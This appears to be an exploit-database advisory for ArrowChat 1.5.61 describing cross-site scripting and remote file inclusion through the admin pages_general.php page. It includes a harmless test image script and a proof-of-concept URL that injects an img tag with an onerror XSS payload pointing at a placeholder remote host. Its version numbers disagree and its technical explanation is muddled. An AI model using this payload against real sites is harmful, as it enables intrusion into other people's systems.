@@ -1,0 +1,55 @@
+id: 20422
+date: 02/21/2013
+title: ArrowChat 1.5.61 RFI Vulnerability
+author: Euforia33
+cves: 
+
+// RFI Vulnerability in ArrowChat 1.6.1
+// RFI PHP Image coded by Euforia33, 21/02/2013.
+// Known vulnerable versions (1.6.1 and below) 
+
+In addition to the XSS and LFI vulnerabilities in ArrowChat 1.5.61 as pointed out by
+Kallimero (http://packetstormsecurity.com/files/119999/ArrowChat-1.5.61-Cross-
+Site-Scripting-Local-File-Inclusion.html), You can also include remote PHP files by
+exploiting the same piece of code:
+
+<form method="post" action="<?php echo $_SERVER['PHP_SELF']; ?>?do=<?php
+echo $do; ?>" enctype="multipart/form-data">
+
+By using image headers, it is possible to include remote PHP files directly onto the
+page through the IMG tags. The onerror is used to show a way to inject XSS without
+the need of the script tags, which are often filtered out. If you wanted to use the
+XSS instead of the RFI, simply point the img src to a location that does not exist it
+will return the error that we have choses which in this case is the XSS injection.
+
+Here's a sample image, rendered in PHP for the purpose of checking if RFI is possible:
+
+<?php
+
+# Strings to display in the image, includes a shuffle for testing functionality of the code
+$maintxt = "RFI Vulnerability Test";
+$exetest = "Packet Storm";
+$exetest2 = str_shuffle($exetest);
+
+$im     = imagecreatetruecolor(350, 120);
+$bg  = ImageColorAllocate($im,0x00,0x00,0x00);
+$txt  = imagecolorallocate($im, 85, 85, 85);
+imagefilledrectangle($im, 0, 0, 350, 120, $bg);
+
+imagettftext($im, 17, 0, 20, 35, -$txt, 'Arial.ttf', "{$maintxt}");
+imagettftext($im, 11, 0, 125, 70, -$txt, 'Arial.ttf', "{$exetest}");
+imagettftext($im, 11, 0, 125, 90, -$txt, 'Arial.ttf', "{$exetest2}");
+
+# Sending image header
+header('Content-type: image/png');
+imagepng($im);
+imagedestroy($im);
+
+?>
+
+PoC: 
+http://[domain.name]/[pathtoArrowChat]/admin/layout/pages_general.php/'"/><img src="http://[remote.domain.name]/Image.php" onerror=alert(33);>
+
+Euforia33.
+
+#  0day.today [2023-03-23]  #
